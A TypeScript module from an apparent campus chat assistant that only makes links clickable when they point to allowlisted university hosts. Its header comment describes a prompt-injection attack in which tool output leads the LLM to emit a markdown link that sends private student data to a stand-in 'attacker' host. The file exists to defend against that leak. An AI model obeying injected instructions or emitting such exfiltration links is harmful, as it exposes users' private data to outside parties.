/**
 * Hosts the chat may render as clickable links.
 *
 * Tool output (web pages, menus, Canvas content) is fed to the LLM alongside
 * the student's campus context, so an injected instruction could make it emit
 * [link](https://attacker/?d=<private data>). Only links to campus hosts and
 * the campus tools we fetch from are clickable; anything else renders as text.
 */

const ALLOWED_HOST_SUFFIXES = ["ucsc.edu"];
const ALLOWED_HOSTS = ["santacruz-sidekick.vercel.app", "cabalex.github.io", "slugsurvival.com"];

function isAllowedHost(host: string): boolean {
  const h = host.toLowerCase();
  return (
    ALLOWED_HOSTS.includes(h) ||
    ALLOWED_HOST_SUFFIXES.some((s) => h === s || h.endsWith(`.${s}`))
  );
}

export function isSafeChatLink(href: string | undefined): boolean {
  if (!href) return false;
  let url: URL;
  try {
    url = new URL(href);
  } catch {
    return false;
  }
  if (url.protocol === "https:") return isAllowedHost(url.hostname);
  if (url.protocol === "mailto:") {
    // One plain address, no query (body/cc could carry data off-campus).
    return url.search === "" && /^[^@,\s]+@ucsc\.edu$/i.test(decodeURIComponent(url.pathname));
  }
  return false;
}
